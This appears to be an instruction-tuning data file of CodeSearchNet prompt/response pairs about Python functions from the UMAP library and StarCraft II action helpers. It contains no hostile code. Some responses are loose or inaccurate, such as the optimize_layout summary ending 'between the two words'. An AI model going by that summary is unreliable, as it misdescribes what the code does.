{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreduces Euclidean distance. Parameters ---------- x: array of shape (embedding_dim,) y: array of shape (embedding_dim,) Returns ------- The squared euclidean distance between x and y", "response": "def rdist(x, y):\n    \"\"\"Reduced Euclidean distance.\n\n    Parameters\n    ----------\n    x: array of shape (embedding_dim,)\n    y: array of shape (embedding_dim,)\n\n    Returns\n    -------\n    The squared euclidean distance between x and y\n    \"\"\"\n    result = 0.0\n    for i in range(x.shape[0]):\n        result += (x[i] - y[i]) ** 2\n\n    return result"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef optimize_layout(\n    head_embedding,\n    tail_embedding,\n    head,\n    tail,\n    n_epochs,\n    n_vertices,\n    epochs_per_sample,\n    a,\n    b,\n    rng_state,\n    gamma=1.0,\n    initial_alpha=1.0,\n    negative_sample_rate=5.0,\n    verbose=False,\n):\n    \"\"\"Improve an embedding using stochastic gradient descent to minimize the\n    fuzzy set cross entropy between the 1-skeletons of the high dimensional\n    and low dimensional fuzzy simplicial sets. In practice this is done by\n    sampling edges based on their membership strength (with the (1-p) terms\n    coming from negative sampling similar to word2vec).\n\n    Parameters\n    ----------\n    head_embedding: array of shape (n_samples, n_components)\n        The initial embedding to be improved by SGD.\n\n    tail_embedding: array of shape (source_samples, n_components)\n        The reference embedding of embedded points. If not embedding new\n        previously unseen points with respect to an existing embedding this\n        is simply the head_embedding (again); otherwise it provides the\n        existing embedding to embed with respect to.\n\n    head: array of shape (n_1_simplices)\n        The indices of the heads of 1-simplices with non-zero membership.\n\n    tail: array of shape (n_1_simplices)\n        The indices of the tails of 1-simplices with non-zero membership.\n\n    n_epochs: int\n        The number of training epochs to use in optimization.\n\n    n_vertices: int\n        The number of vertices (0-simplices) in the dataset.\n\n    epochs_per_samples: array of shape (n_1_simplices)\n        A float value of the number of epochs per 1-simplex. 1-simplices with\n        weaker membership strength will have more epochs between being sampled.\n\n    a: float\n        Parameter of differentiable approximation of right adjoint functor\n\n    b: float\n        Parameter of differentiable approximation of right adjoint functor\n\n    rng_state: array of int64, shape (3,)\n        The internal state of the rng\n\n    gamma: float (optional, default 1.0)\n        Weight to apply to negative samples.\n\n    initial_alpha: float (optional, default 1.0)\n        Initial learning rate for the SGD.\n\n    negative_sample_rate: int (optional, default 5)\n        Number of negative samples to use per positive sample.\n\n    verbose: bool (optional, default False)\n        Whether to report information on the current progress of the algorithm.\n\n    Returns\n    -------\n    embedding: array of shape (n_samples, n_components)\n        The optimized embedding.\n    \"\"\"\n\n    dim = head_embedding.shape[1]\n    move_other = head_embedding.shape[0] == tail_embedding.shape[0]\n    alpha = initial_alpha\n\n    epochs_per_negative_sample = epochs_per_sample / negative_sample_rate\n    epoch_of_next_negative_sample = epochs_per_negative_sample.copy()\n    epoch_of_next_sample = epochs_per_sample.copy()\n\n    for n in range(n_epochs):\n        for i in range(epochs_per_sample.shape[0]):\n            if epoch_of_next_sample[i] <= n:\n                j = head[i]\n                k = tail[i]\n\n                current = head_embedding[j]\n                other = tail_embedding[k]\n\n                dist_squared = rdist(current, other)\n\n                if dist_squared > 0.0:\n                    grad_coeff = -2.0 * a * b * pow(dist_squared, b - 1.0)\n                    grad_coeff /= a * pow(dist_squared, b) + 1.0\n                else:\n                    grad_coeff = 0.0\n\n                for d in range(dim):\n                    grad_d = clip(grad_coeff * (current[d] - other[d]))\n                    current[d] += grad_d * alpha\n                    if move_other:\n                        other[d] += -grad_d * alpha\n\n                epoch_of_next_sample[i] += epochs_per_sample[i]\n\n                n_neg_samples = int(\n                    (n - epoch_of_next_negative_sample[i])\n                    / epochs_per_negative_sample[i]\n                )\n\n                for p in range(n_neg_samples):\n                    k = tau_rand_int(rng_state) % n_vertices\n\n                    other = tail_embedding[k]\n\n                    dist_squared = rdist(current, other)\n\n                    if dist_squared > 0.0:\n                        grad_coeff = 2.0 * gamma * b\n                        grad_coeff /= (0.001 + dist_squared) * (\n                            a * pow(dist_squared, b) + 1\n                        )\n                    elif j == k:\n                        continue\n                    else:\n                        grad_coeff = 0.0\n\n                    for d in range(dim):\n                        if grad_coeff > 0.0:\n                            grad_d = clip(grad_coeff * (current[d] - other[d]))\n                        else:\n                            grad_d = 4.0\n                        current[d] += grad_d * alpha\n\n                epoch_of_next_negative_sample[i] += (\n                    n_neg_samples * epochs_per_negative_sample[i]\n                )\n\n        alpha = initial_alpha * (1.0 - (float(n) / float(n_epochs)))\n\n        if verbose and n % int(n_epochs / 10) == 0:\n            print(\"\\tcompleted \", n, \" / \", n_epochs, \"epochs\")\n\n    return head_embedding", "response": "Improve an embedding using stochastic gradient descent to minimize the fuzzy set cross entropy between the two words."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nperforming a fuzzy simplicial set embedding on the given data.", "response": "def simplicial_set_embedding(\n    data,\n    graph,\n    n_components,\n    initial_alpha,\n    a,\n    b,\n    gamma,\n    negative_sample_rate,\n    n_epochs,\n    init,\n    random_state,\n    metric,\n    metric_kwds,\n    verbose,\n):\n    \"\"\"Perform a fuzzy simplicial set embedding, using a specified\n    initialisation method and then minimizing the fuzzy set cross entropy\n    between the 1-skeletons of the high and low dimensional fuzzy simplicial\n    sets.\n\n    Parameters\n    ----------\n    data: array of shape (n_samples, n_features)\n        The source data to be embedded by UMAP.\n\n    graph: sparse matrix\n        The 1-skeleton of the high dimensional fuzzy simplicial set as\n        represented by a graph for which we require a sparse matrix for the\n        (weighted) adjacency matrix.\n\n    n_components: int\n        The dimensionality of the euclidean space into which to embed the data.\n\n    initial_alpha: float\n        Initial learning rate for the SGD.\n\n    a: float\n        Parameter of differentiable approximation of right adjoint functor\n\n    b: float\n        Parameter of differentiable approximation of right adjoint functor\n\n    gamma: float\n        Weight to apply to negative samples.\n\n    negative_sample_rate: int (optional, default 5)\n        The number of negative samples to select per positive sample\n        in the optimization process. Increasing this value will result\n        in greater repulsive force being applied, greater optimization\n        cost, but slightly more accuracy.\n\n    n_epochs: int (optional, default 0)\n        The number of training epochs to be used in optimizing the\n        low dimensional embedding. Larger values result in more accurate\n        embeddings. If 0 is specified a value will be selected based on\n        the size of the input dataset (200 for large datasets, 500 for small).\n\n    init: string\n        How to initialize the low dimensional embedding. Options are:\n            * 'spectral': use a spectral embedding of the fuzzy 1-skeleton\n            * 'random': assign initial embedding positions at random.\n            * A numpy array of initial embedding positions.\n\n    random_state: numpy RandomState or equivalent\n        A state capable being used as a numpy random state.\n\n    metric: string\n        The metric used to measure distance in high dimensional space; used if\n        multiple connected components need to be layed out.\n\n    metric_kwds: dict\n        Key word arguments to be passed to the metric function; used if\n        multiple connected components need to be layed out.\n\n    verbose: bool (optional, default False)\n        Whether to report information on the current progress of the algorithm.\n\n    Returns\n    -------\n    embedding: array of shape (n_samples, n_components)\n        The optimized of ``graph`` into an ``n_components`` dimensional\n        euclidean space.\n    \"\"\"\n    graph = graph.tocoo()\n    graph.sum_duplicates()\n    n_vertices = graph.shape[1]\n\n    if n_epochs <= 0:\n        # For smaller datasets we can use more epochs\n        if graph.shape[0] <= 10000:\n            n_epochs = 500\n        else:\n            n_epochs = 200\n\n    graph.data[graph.data < (graph.data.max() / float(n_epochs))] = 0.0\n    graph.eliminate_zeros()\n\n    if isinstance(init, str) and init == \"random\":\n        embedding = random_state.uniform(\n            low=-10.0, high=10.0, size=(graph.shape[0], n_components)\n        ).astype(np.float32)\n    elif isinstance(init, str) and init == \"spectral\":\n        # We add a little noise to avoid local minima for optimization to come\n        initialisation = spectral_layout(\n            data,\n            graph,\n            n_components,\n            random_state,\n            metric=metric,\n            metric_kwds=metric_kwds,\n        )\n        expansion = 10.0 / np.abs(initialisation).max()\n        embedding = (initialisation * expansion).astype(\n            np.float32\n        ) + random_state.normal(\n            scale=0.0001, size=[graph.shape[0], n_components]\n        ).astype(\n            np.float32\n        )\n    else:\n        init_data = np.array(init)\n        if len(init_data.shape) == 2:\n            if np.unique(init_data, axis=0).shape[0] < init_data.shape[0]:\n                tree = KDTree(init_data)\n                dist, ind = tree.query(init_data, k=2)\n                nndist = np.mean(dist[:, 1])\n                embedding = init_data + np.random.normal(\n                    scale=0.001 * nndist, size=init_data.shape\n                ).astype(np.float32)\n            else:\n                embedding = init_data\n\n    epochs_per_sample = make_epochs_per_sample(graph.data, n_epochs)\n\n    head = graph.row\n    tail = graph.col\n\n    rng_state = random_state.randint(INT32_MIN, INT32_MAX, 3).astype(np.int64)\n    embedding = optimize_layout(\n        embedding,\n        embedding,\n        head,\n        tail,\n        n_epochs,\n        n_vertices,\n        epochs_per_sample,\n        a,\n        b,\n        rng_state,\n        gamma,\n        initial_alpha,\n        negative_sample_rate,\n        verbose=verbose,\n    )\n\n    return embedding"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ninitializes the positions of new points relative to the indices and weights of the neighbors of each new sample.", "response": "def init_transform(indices, weights, embedding):\n    \"\"\"Given indices and weights and an original embeddings\n    initialize the positions of new points relative to the\n    indices and weights (of their neighbors in the source data).\n\n    Parameters\n    ----------\n    indices: array of shape (n_new_samples, n_neighbors)\n        The indices of the neighbors of each new sample\n\n    weights: array of shape (n_new_samples, n_neighbors)\n        The membership strengths of associated 1-simplices\n        for each of the new samples.\n\n    embedding: array of shape (n_samples, dim)\n        The original embedding of the source data.\n\n    Returns\n    -------\n    new_embedding: array of shape (n_new_samples, dim)\n        An initial embedding of the new sample points.\n    \"\"\"\n    result = np.zeros((indices.shape[0], embedding.shape[1]), dtype=np.float32)\n\n    for i in range(indices.shape[0]):\n        for j in range(indices.shape[1]):\n            for d in range(embedding.shape[1]):\n                result[i, d] += weights[i, j] * embedding[indices[i, j], d]\n\n    return result"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef find_ab_params(spread, min_dist):\n\n    def curve(x, a, b):\n        return 1.0 / (1.0 + a * x ** (2 * b))\n\n    xv = np.linspace(0, spread * 3, 300)\n    yv = np.zeros(xv.shape)\n    yv[xv < min_dist] = 1.0\n    yv[xv >= min_dist] = np.exp(-(xv[xv >= min_dist] - min_dist) / spread)\n    params, covar = curve_fit(curve, xv, yv)\n    return params[0], params[1]", "response": "Fit a b params for the differentiable curve used in lower\n    dimensional fuzzy simplicial complex construction."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nfitting the UMAP to X.", "response": "def fit(self, X, y=None):\n        \"\"\"Fit X into an embedded space.\n\n        Optionally use y for supervised dimension reduction.\n\n        Parameters\n        ----------\n        X : array, shape (n_samples, n_features) or (n_samples, n_samples)\n            If the metric is 'precomputed' X must be a square distance\n            matrix. Otherwise it contains a sample per row. If the method\n            is 'exact', X may be a sparse matrix of type 'csr', 'csc'\n            or 'coo'.\n\n        y : array, shape (n_samples)\n            A target array for supervised dimension reduction. How this is\n            handled is determined by parameters UMAP was instantiated with.\n            The relevant attributes are ``target_metric`` and\n            ``target_metric_kwds``.\n        \"\"\"\n\n        X = check_array(X, dtype=np.float32, accept_sparse=\"csr\")\n        self._raw_data = X\n\n        # Handle all the optional arguments, setting default\n        if self.a is None or self.b is None:\n            self._a, self._b = find_ab_params(self.spread, self.min_dist)\n        else:\n            self._a = self.a\n            self._b = self.b\n\n        if self.metric_kwds is not None:\n            self._metric_kwds = self.metric_kwds\n        else:\n            self._metric_kwds = {}\n\n        if self.target_metric_kwds is not None:\n            self._target_metric_kwds = self.target_metric_kwds\n        else:\n            self._target_metric_kwds = {}\n\n        if isinstance(self.init, np.ndarray):\n            init = check_array(self.init, dtype=np.float32, accept_sparse=False)\n        else:\n            init = self.init\n\n        self._initial_alpha = self.learning_rate\n\n        self._validate_parameters()\n\n        if self.verbose:\n            print(str(self))\n\n        # Error check n_neighbors based on data size\n        if X.shape[0] <= self.n_neighbors:\n            if X.shape[0] == 1:\n                self.embedding_ = np.zeros((1, self.n_components))  # needed to sklearn comparability\n                return self\n\n            warn(\n                \"n_neighbors is larger than the dataset size; truncating to \"\n                \"X.shape[0] - 1\"\n            )\n            self._n_neighbors = X.shape[0] - 1\n        else:\n            self._n_neighbors = self.n_neighbors\n\n        if scipy.sparse.isspmatrix_csr(X):\n            if not X.has_sorted_indices:\n                X.sort_indices()\n            self._sparse_data = True\n        else:\n            self._sparse_data = False\n\n        random_state = check_random_state(self.random_state)\n\n        if self.verbose:\n            print(\"Construct fuzzy simplicial set\")\n\n        # Handle small cases efficiently by computing all distances\n        if X.shape[0] < 4096:\n            self._small_data = True\n            dmat = pairwise_distances(X, metric=self.metric, **self._metric_kwds)\n            self.graph_ = fuzzy_simplicial_set(\n                dmat,\n                self._n_neighbors,\n                random_state,\n                \"precomputed\",\n                self._metric_kwds,\n                None,\n                None,\n                self.angular_rp_forest,\n                self.set_op_mix_ratio,\n                self.local_connectivity,\n                self.verbose,\n            )\n        else:\n            self._small_data = False\n            # Standard case\n            (self._knn_indices, self._knn_dists, self._rp_forest) = nearest_neighbors(\n                X,\n                self._n_neighbors,\n                self.metric,\n                self._metric_kwds,\n                self.angular_rp_forest,\n                random_state,\n                self.verbose,\n            )\n\n            self.graph_ = fuzzy_simplicial_set(\n                X,\n                self.n_neighbors,\n                random_state,\n                self.metric,\n                self._metric_kwds,\n                self._knn_indices,\n                self._knn_dists,\n                self.angular_rp_forest,\n                self.set_op_mix_ratio,\n                self.local_connectivity,\n                self.verbose,\n            )\n\n            self._search_graph = scipy.sparse.lil_matrix(\n                (X.shape[0], X.shape[0]), dtype=np.int8\n            )\n            self._search_graph.rows = self._knn_indices\n            self._search_graph.data = (self._knn_dists != 0).astype(np.int8)\n            self._search_graph = self._search_graph.maximum(\n                self._search_graph.transpose()\n            ).tocsr()\n\n            if callable(self.metric):\n                self._distance_func = self.metric\n            elif self.metric in dist.named_distances:\n                self._distance_func = dist.named_distances[self.metric]\n            elif self.metric == 'precomputed':\n                warn('Using precomputed metric; transform will be unavailable for new data')\n            else:\n                raise ValueError(\n                    \"Metric is neither callable, \" + \"nor a recognised string\"\n                )\n\n            if self.metric != 'precomputed':\n                self._dist_args = tuple(self._metric_kwds.values())\n\n                self._random_init, self._tree_init = make_initialisations(\n                    self._distance_func, self._dist_args\n                )\n                self._search = make_initialized_nnd_search(\n                    self._distance_func, self._dist_args\n                )\n\n        if y is not None:\n            if len(X) != len(y):\n                raise ValueError(\n                    \"Length of x = {len_x}, length of y = {len_y}, while it must be equal.\".format(\n                        len_x=len(X), len_y=len(y)\n                    )\n                )\n            y_ = check_array(y, ensure_2d=False)\n            if self.target_metric == \"categorical\":\n                if self.target_weight < 1.0:\n                    far_dist = 2.5 * (1.0 / (1.0 - self.target_weight))\n                else:\n                    far_dist = 1.0e12\n                self.graph_ = categorical_simplicial_set_intersection(\n                    self.graph_, y_, far_dist=far_dist\n                )\n            else:\n                if self.target_n_neighbors == -1:\n                    target_n_neighbors = self._n_neighbors\n                else:\n                    target_n_neighbors = self.target_n_neighbors\n\n                # Handle the small case as precomputed as before\n                if y.shape[0] < 4096:\n                    ydmat = pairwise_distances(y_[np.newaxis, :].T,\n                                               metric=self.target_metric,\n                                               **self._target_metric_kwds)\n                    target_graph = fuzzy_simplicial_set(\n                        ydmat,\n                        target_n_neighbors,\n                        random_state,\n                        \"precomputed\",\n                        self._target_metric_kwds,\n                        None,\n                        None,\n                        False,\n                        1.0,\n                        1.0,\n                        False\n                    )\n                else:\n                    # Standard case\n                    target_graph = fuzzy_simplicial_set(\n                        y_[np.newaxis, :].T,\n                        target_n_neighbors,\n                        random_state,\n                        self.target_metric,\n                        self._target_metric_kwds,\n                        None,\n                        None,\n                        False,\n                        1.0,\n                        1.0,\n                        False,\n                    )\n                # product = self.graph_.multiply(target_graph)\n                # # self.graph_ = 0.99 * product + 0.01 * (self.graph_ +\n                # #                                        target_graph -\n                # #                                        product)\n                # self.graph_ = product\n                self.graph_ = general_simplicial_set_intersection(\n                    self.graph_, target_graph, self.target_weight\n                )\n                self.graph_ = reset_local_connectivity(self.graph_)\n\n        if self.n_epochs is None:\n            n_epochs = 0\n        else:\n            n_epochs = self.n_epochs\n\n        if self.verbose:\n            print(ts(), \"Construct embedding\")\n\n        self.embedding_ = simplicial_set_embedding(\n            self._raw_data,\n            self.graph_,\n            self.n_components,\n            self._initial_alpha,\n            self._a,\n            self._b,\n            self.repulsion_strength,\n            self.negative_sample_rate,\n            n_epochs,\n            init,\n            random_state,\n            self.metric,\n            self._metric_kwds,\n            self.verbose,\n        )\n\n        if self.verbose:\n            print(ts() + \" Finished embedding\")\n\n        self._input_hash = joblib.hash(self._raw_data)\n\n        return self"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef fit_transform(self, X, y=None):\n        self.fit(X, y)\n        return self.embedding_", "response": "Fit X into an embedded space and return that transformed\n            output."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ntransform X into the existing embedded space and return X_new.", "response": "def transform(self, X):\n        \"\"\"Transform X into the existing embedded space and return that\n        transformed output.\n\n        Parameters\n        ----------\n        X : array, shape (n_samples, n_features)\n            New data to be transformed.\n\n        Returns\n        -------\n        X_new : array, shape (n_samples, n_components)\n            Embedding of the new data in low-dimensional space.\n        \"\"\"\n        # If we fit just a single instance then error\n        if self.embedding_.shape[0] == 1:\n            raise ValueError('Transform unavailable when model was fit with'\n                             'only a single data sample.')\n        # If we just have the original input then short circuit things\n        X = check_array(X, dtype=np.float32, accept_sparse=\"csr\")\n        x_hash = joblib.hash(X)\n        if x_hash == self._input_hash:\n            return self.embedding_\n\n        if self._sparse_data:\n            raise ValueError(\"Transform not available for sparse input.\")\n        elif self.metric == 'precomputed':\n            raise ValueError(\"Transform  of new data not available for \"\n                             \"precomputed metric.\")\n\n        X = check_array(X, dtype=np.float32, order=\"C\")\n        random_state = check_random_state(self.transform_seed)\n        rng_state = random_state.randint(INT32_MIN, INT32_MAX, 3).astype(np.int64)\n\n        if self._small_data:\n            dmat = pairwise_distances(\n                X, self._raw_data, metric=self.metric, **self._metric_kwds\n            )\n            indices = np.argpartition(dmat,\n                                      self._n_neighbors)[:, :self._n_neighbors]\n            dmat_shortened = submatrix(dmat, indices, self._n_neighbors)\n            indices_sorted = np.argsort(dmat_shortened)\n            indices = submatrix(indices, indices_sorted, self._n_neighbors)\n            dists = submatrix(dmat_shortened, indices_sorted,\n                              self._n_neighbors)\n        else:\n            init = initialise_search(\n                self._rp_forest,\n                self._raw_data,\n                X,\n                int(self._n_neighbors * self.transform_queue_size),\n                self._random_init,\n                self._tree_init,\n                rng_state,\n            )\n            result = self._search(\n                self._raw_data,\n                self._search_graph.indptr,\n                self._search_graph.indices,\n                init,\n                X,\n            )\n\n            indices, dists = deheap_sort(result)\n            indices = indices[:, : self._n_neighbors]\n            dists = dists[:, : self._n_neighbors]\n\n        adjusted_local_connectivity = max(0, self.local_connectivity - 1.0)\n        sigmas, rhos = smooth_knn_dist(\n            dists, self._n_neighbors, local_connectivity=adjusted_local_connectivity\n        )\n\n        rows, cols, vals = compute_membership_strengths(indices, dists, sigmas, rhos)\n\n        graph = scipy.sparse.coo_matrix(\n            (vals, (rows, cols)), shape=(X.shape[0], self._raw_data.shape[0])\n        )\n\n        # This was a very specially constructed graph with constant degree.\n        # That lets us do fancy unpacking by reshaping the csr matrix indices\n        # and data. Doing so relies on the constant degree assumption!\n        csr_graph = normalize(graph.tocsr(), norm=\"l1\")\n        inds = csr_graph.indices.reshape(X.shape[0], self._n_neighbors)\n        weights = csr_graph.data.reshape(X.shape[0], self._n_neighbors)\n        embedding = init_transform(inds, weights, self.embedding_)\n\n        if self.n_epochs is None:\n            # For smaller datasets we can use more epochs\n            if graph.shape[0] <= 10000:\n                n_epochs = 100\n            else:\n                n_epochs = 30\n        else:\n            n_epochs = self.n_epochs // 3.0\n\n        graph.data[graph.data < (graph.data.max() / float(n_epochs))] = 0.0\n        graph.eliminate_zeros()\n\n        epochs_per_sample = make_epochs_per_sample(graph.data, n_epochs)\n\n        head = graph.row\n        tail = graph.col\n\n        embedding = optimize_layout(\n            embedding,\n            self.embedding_,\n            head,\n            tail,\n            n_epochs,\n            graph.shape[1],\n            epochs_per_sample,\n            self._a,\n            self._b,\n            rng_state,\n            self.repulsion_strength,\n            self._initial_alpha,\n            self.negative_sample_rate,\n            verbose=self.verbose,\n        )\n\n        return embedding"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef make_sparse_nn_descent(sparse_dist, dist_args):\n\n    @numba.njit(parallel=True)\n    def nn_descent(\n        inds,\n        indptr,\n        data,\n        n_vertices,\n        n_neighbors,\n        rng_state,\n        max_candidates=50,\n        n_iters=10,\n        delta=0.001,\n        rho=0.5,\n        rp_tree_init=True,\n        leaf_array=None,\n        verbose=False,\n    ):\n\n        current_graph = make_heap(n_vertices, n_neighbors)\n        for i in range(n_vertices):\n            indices = rejection_sample(n_neighbors, n_vertices, rng_state)\n            for j in range(indices.shape[0]):\n\n                from_inds = inds[indptr[i] : indptr[i + 1]]\n                from_data = data[indptr[i] : indptr[i + 1]]\n\n                to_inds = inds[indptr[indices[j]] : indptr[indices[j] + 1]]\n                to_data = data[indptr[indices[j]] : indptr[indices[j] + 1]]\n\n                d = sparse_dist(from_inds, from_data, to_inds, to_data, *dist_args)\n\n                heap_push(current_graph, i, d, indices[j], 1)\n                heap_push(current_graph, indices[j], d, i, 1)\n\n        if rp_tree_init:\n            for n in range(leaf_array.shape[0]):\n                for i in range(leaf_array.shape[1]):\n                    if leaf_array[n, i] < 0:\n                        break\n                    for j in range(i + 1, leaf_array.shape[1]):\n                        if leaf_array[n, j] < 0:\n                            break\n\n                        from_inds = inds[\n                            indptr[leaf_array[n, i]] : indptr[leaf_array[n, i] + 1]\n                        ]\n                        from_data = data[\n                            indptr[leaf_array[n, i]] : indptr[leaf_array[n, i] + 1]\n                        ]\n\n                        to_inds = inds[\n                            indptr[leaf_array[n, j]] : indptr[leaf_array[n, j] + 1]\n                        ]\n                        to_data = data[\n                            indptr[leaf_array[n, j]] : indptr[leaf_array[n, j] + 1]\n                        ]\n\n                        d = sparse_dist(\n                            from_inds, from_data, to_inds, to_data, *dist_args\n                        )\n\n                        heap_push(\n                            current_graph, leaf_array[n, i], d, leaf_array[n, j], 1\n                        )\n                        heap_push(\n                            current_graph, leaf_array[n, j], d, leaf_array[n, i], 1\n                        )\n\n        for n in range(n_iters):\n            if verbose:\n                print(\"\\t\", n, \" / \", n_iters)\n\n            candidate_neighbors = build_candidates(\n                current_graph, n_vertices, n_neighbors, max_candidates, rng_state\n            )\n\n            c = 0\n            for i in range(n_vertices):\n                for j in range(max_candidates):\n                    p = int(candidate_neighbors[0, i, j])\n                    if p < 0 or tau_rand(rng_state) < rho:\n                        continue\n                    for k in range(max_candidates):\n                        q = int(candidate_neighbors[0, i, k])\n                        if (\n                            q < 0\n                            or not candidate_neighbors[2, i, j]\n                            and not candidate_neighbors[2, i, k]\n                        ):\n                            continue\n\n                        from_inds = inds[indptr[p] : indptr[p + 1]]\n                        from_data = data[indptr[p] : indptr[p + 1]]\n\n                        to_inds = inds[indptr[q] : indptr[q + 1]]\n                        to_data = data[indptr[q] : indptr[q + 1]]\n\n                        d = sparse_dist(\n                            from_inds, from_data, to_inds, to_data, *dist_args\n                        )\n\n                        c += heap_push(current_graph, p, d, q, 1)\n                        c += heap_push(current_graph, q, d, p, 1)\n\n            if c <= delta * n_neighbors * n_vertices:\n                break\n\n        return deheap_sort(current_graph)\n\n    return nn_descent", "response": "Create a numba accelerated version of nearest neighbor descent for a given distance metric and metric arguments on the given CSR ind indptr and data format."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef interface_options(score=False, raw=False, features=None, rgb=None):\n  interface = sc_pb.InterfaceOptions()\n  interface.score = score\n  interface.raw = raw\n  if features:\n    interface.feature_layer.width = 24\n    interface.feature_layer.resolution.x = features\n    interface.feature_layer.resolution.y = features\n    interface.feature_layer.minimap_resolution.x = features\n    interface.feature_layer.minimap_resolution.y = features\n  if rgb:\n    interface.render.resolution.x = rgb\n    interface.render.resolution.y = rgb\n    interface.render.minimap_resolution.x = rgb\n    interface.render.minimap_resolution.y = rgb\n  return interface", "response": "Return an InterfaceOptions object for the config."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef DEFINE_point(name, default, help):  # pylint: disable=invalid-name,redefined-builtin\n  flags.DEFINE(PointParser(), name, default, help)", "response": "Registers a flag whose value parses as a point."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef spatial(action, action_space):\n  if action_space == ActionSpace.FEATURES:\n    return action.action_feature_layer\n  elif action_space == ActionSpace.RGB:\n    return action.action_render\n  else:\n    raise ValueError(\"Unexpected value for action_space: %s\" % action_space)", "response": "Choose the spatial layer for the action proto."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef select_point(action, action_space, select_point_act, screen):\n  select = spatial(action, action_space).unit_selection_point\n  screen.assign_to(select.selection_screen_coord)\n  select.type = select_point_act", "response": "Select a unit at a point."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef select_rect(action, action_space, select_add, screen, screen2):\n  select = spatial(action, action_space).unit_selection_rect\n  out_rect = select.selection_screen_coord.add()\n  screen_rect = point.Rect(screen, screen2)\n  screen_rect.tl.assign_to(out_rect.p0)\n  screen_rect.br.assign_to(out_rect.p1)\n  select.selection_add = bool(select_add)", "response": "Select units within a rectangle."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef select_idle_worker(action, action_space, select_worker):\n  del action_space\n  action.action_ui.select_idle_worker.type = select_worker", "response": "Select an idle worker."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nselects the entire army.", "response": "def select_army(action, action_space, select_add):\n  \"\"\"Select the entire army.\"\"\"\n  del action_space\n  action.action_ui.select_army.selection_add = select_add"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nselecting all warp gates.", "response": "def select_warp_gates(action, action_space, select_add):\n  \"\"\"Select all warp gates.\"\"\"\n  del action_space\n  action.action_ui.select_warp_gates.selection_add = select_add"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef select_unit(action, action_space, select_unit_act, select_unit_id):\n  del action_space\n  select = action.action_ui.multi_panel\n  select.type = select_unit_act\n  select.unit_index = select_unit_id", "response": "Select a specific unit from the multi - unit selection."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef control_group(action, action_space, control_group_act, control_group_id):\n  del action_space\n  select = action.action_ui.control_group\n  select.action = control_group_act\n  select.control_group_index = control_group_id", "response": "Act on a control group selecting setting etc."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef unload(action, action_space, unload_id):\n  del action_space\n  action.action_ui.cargo_panel.unit_index = unload_id", "response": "Unload a unit from a transport"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef build_queue(action, action_space, build_queue_id):\n  del action_space\n  action.action_ui.production_panel.unit_index = build_queue_id", "response": "Cancel a unit in the build queue."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ndoes a quick command like Stop or Stim.", "response": "def cmd_quick(action, action_space, ability_id, queued):\n  \"\"\"Do a quick command like 'Stop' or 'Stim'.\"\"\"\n  action_cmd = spatial(action, action_space).unit_command\n  action_cmd.ability_id = ability_id\n  action_cmd.queue_command = queued"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef cmd_screen(action, action_space, ability_id, queued, screen):\n  action_cmd = spatial(action, action_space).unit_command\n  action_cmd.ability_id = ability_id\n  action_cmd.queue_command = queued\n  screen.assign_to(action_cmd.target_screen_coord)", "response": "Do a command that needs a point on the screen."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef cmd_minimap(action, action_space, ability_id, queued, minimap):\n  action_cmd = spatial(action, action_space).unit_command\n  action_cmd.ability_id = ability_id\n  action_cmd.queue_command = queued\n  minimap.assign_to(action_cmd.target_minimap_coord)", "response": "Do a command that needs a point on the minimap."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef enum(cls, options, values):\n    names, real = zip(*options)\n    del names  # unused\n\n    def factory(i, name):\n      return cls(i, name, (len(real),), lambda a: real[a[0]], values)\n    return factory", "response": "Create an ArgumentType where you choose one of a set of known values."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncreate an ArgumentType with a single scalar in range value.", "response": "def scalar(cls, value):\n    \"\"\"Create an ArgumentType with a single scalar in range(value).\"\"\"\n    return lambda i, name: cls(i, name, (value,), lambda a: a[0], None)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncreating an ArgumentType that is represented by a point. Point.", "response": "def point(cls):  # No range because it's unknown at this time.\n    \"\"\"Create an ArgumentType that is represented by a point.Point.\"\"\"\n    def factory(i, name):\n      return cls(i, name, (0, 0), lambda a: point.Point(*a).floor(), None)\n    return factory"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef types(cls, **kwargs):\n    named = {name: factory(Arguments._fields.index(name), name)\n             for name, factory in six.iteritems(kwargs)}\n    return cls(**named)", "response": "Create an Arguments of the possible Types."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef ui_func(cls, id_, name, function_type, avail_fn=always):\n    return cls(id_, name, 0, 0, function_type, FUNCTION_TYPES[function_type],\n               avail_fn)", "response": "Define a function representing a ui action."}
